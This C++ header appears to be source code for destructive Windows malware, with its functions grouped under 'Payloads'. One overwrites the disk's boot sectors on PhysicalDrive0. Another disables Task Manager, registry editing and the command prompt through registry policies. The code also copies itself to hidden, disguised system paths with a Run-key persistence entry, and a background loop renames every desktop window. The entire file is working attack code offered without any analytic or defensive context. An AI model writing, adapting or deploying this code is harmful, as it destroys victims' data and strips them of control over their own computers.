// DESTRUCTION HEADER //
#pragma once

#define NULL_ATTRIBUTES 0
#define CURRENT_USER HKEY_CURRENT_USER
#define LOCAL_MACHINE HKEY_LOCAL_MACHINE
#define delta TEXT("\u0394")
#include "Buffer.h"
#include "System.h"

LPCWSTR lpwszSystemPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\POLICIES\\SYSTEM";

namespace Payloads {
	
	VOID OverwriteMBR(VOID) {
		// OVERWRITES FIRST 64 SECTORS //
		DWORD lpNumberOfBytesWritten;
		HANDLE hFile = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL_ATTRIBUTES, NULL);
		BOOL statement = WriteFile(hFile, lpcBuffer, 32768, &lpNumberOfBytesWritten, NULL);
		if (!statement) exit(0);
		CloseHandle(hFile);
	}
	
	VOID SystemToolDisable(VOID) {
		// DISABLES CRUCIAL SYSTEM TOOLS //
		System::ManageRegW(CURRENT_USER, lpwszSystemPath, L"DisableTaskmgr", REG_DWORD, 1, NULL, FALSE, FALSE);
		System::ManageRegW(CURRENT_USER, lpwszSystemPath, L"DisableRegistryTools", REG_DWORD, 1, NULL, FALSE, FALSE);
		System::ManageRegW(CURRENT_USER, L"SOFTWARE\\POLICIES\\Microsoft\\Windows\\SYSTEM", L"DisableCmd", REG_DWORD, 1, NULL, FALSE, FALSE);
	}
	
	VOID InfectSys(VOID) {
		// COPY ITSELF //
		LPCWSTR lpwszPaths[5] = {
			L"C:\\WINDOWS\\System32\\delta.exe",
			L"C:\\WINDOWS\\delta.inf",
			L"C:\\WINDOWS\\Web\\triexe.png.exe",
			L"C:\\260.t",
			L"C:\\WINDOWS\\System32\\oobe\\regerror\rremovedelta.js.exe"
		};
		INT totpath = _countof(lpwszPaths);
		for (INT i = 0; i < totpath; i++) {
			System::ExtCopyFile(getCurrentDir(), lpwszPaths[i], TRUE, FILE_ATTRIBUTE_HIDDEN);
			System::ManageRegW(LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", L"Fourth Greek Letter", 0, 0, (BYTE*)lpwszPaths[2], FALSE, TRUE);
		}
	}
	
	INT CALLBACK EnumStrProc(HWND hwnd, LPARAM lP) {
		SetWindowTextA(hwnd, delta);
		return 0x01;
	}
	
	DWORD WINAPI TextProc(LPVOID lpProc) {
		while (TRUE) {
			HWND hwnd = GetDesktopWindow();
			EnumChildWindows(hwnd, &EnumStrProc, 0);
			Sleep(5);
		}
		return 0x00;
	}
}
